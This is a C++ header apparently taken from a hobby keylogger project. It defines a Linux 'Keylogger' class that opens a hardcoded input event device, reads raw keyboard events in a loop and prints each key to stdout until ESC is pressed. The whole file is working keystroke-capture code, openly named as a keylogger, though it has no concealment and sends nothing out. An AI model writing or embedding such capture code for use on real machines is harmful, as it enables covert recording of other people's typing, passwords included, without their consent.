#pragma once

#ifdef __linux__
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <iostream>
#include <cstring>
#endif

#include "../helper.h"

class Keylogger {
public: 
#ifdef __linux__
  /*
  * Hardcode to correct event device for now
  */
  std::string get_kb_device() {
    return "/dev/input/event3";
  }

  /*
  * Outputs key events to stdout
  */
  void log_event(std::string kb_device) {
    int fd = open(kb_device.c_str(), O_RDONLY);
    if (fd == -1) {
      std::cerr << "Error opening device: " << kb_device << "\n";
      return;
    }

    struct input_event ev;
    while (true) {
      read(fd, &ev, sizeof(ev));
      if (ev.type == EV_KEY && ev.value == 0) {
        std::cout << "Key pressed: " << helper::keycodes[ev.code] << "\n";
      }
      if (strcmp(helper::keycodes[ev.code], "ESC") == 0) {
        std::cout << "Exiting...\n";
        break;
      }
    }
    close(fd);
  }
#endif
};
